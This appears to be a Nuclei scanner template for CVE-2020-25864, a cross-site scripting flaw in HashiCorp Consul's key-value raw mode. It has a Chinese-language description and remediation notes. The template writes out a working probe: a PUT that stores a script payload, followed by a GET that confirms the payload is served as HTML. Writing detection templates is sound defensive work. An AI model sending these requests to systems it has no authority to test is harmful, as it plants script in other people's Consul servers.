id: CVE-2020-25864
info:
  name: HashiCorp Consul and Consul Enterprise up to version 1.9.4 key-value (KV)
    raw mode is vulnerable to cross-site scripting
  author:
  - l0ne1y
  description: |-
    HashiCorp Consul and Consul Enterprise 跨站脚本漏洞
    Hashicorp HashiCorp Consul是美国HashiCorp（Hashicorp）公司的一套分布式、高可用数据中心感知解决方案。该产品用于跨动态分布式基础架构连接和配置应用程序。

    HashiCorp Consul and Consul Enterprise 1.9.4版本存在安全漏洞，该漏洞源于原始模式容易受到跨站点脚本攻击。
  severity: medium
  remediation: |-
    官方修复方案：
    1、目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://discuss.hashicorp.com/t/hcsec-2021-07-consul-api-kv-endpoint-vulnerable-to-cross-site-scripting/23368

    临时修复方案：
    1、对输入(和URL参数)进行过滤，对输出进行编码，白名单和黑名单结合。也就是对提交的所有内容进行过滤，对url中的参数进行过滤，过滤掉会导致脚本执行的相关内容；然后对动态输出到页面的内容进行html编码，使脚本无法在浏览器中执行。虽然对输入过滤可以被绕过，但是也还是会拦截很大一部分的XSS攻击；最后对字符进行白名单或者黑名单限制。
requests:
- matchers:
  - type: status
    status:
    - 200
  - type: word
    part: header
    words:
    - text/html
  - type: word
    part: body_2
    words:
    - <!DOCTYPE html><script>alert(document.domain)</script>
  matchers-condition: and
  raw:
  - |
    PUT {{BaseURL}}/v1/kv/{{randstr}} HTTP/1.1
    Host: {{Hostname}}

    <!DOCTYPE html><script>alert(document.domain)</script>
  - |
    GET {{BaseURL}}/v1/kv/{{randstr}}%3Fraw HTTP/1.1
    Host: {{Hostname}}
  req-condition: true
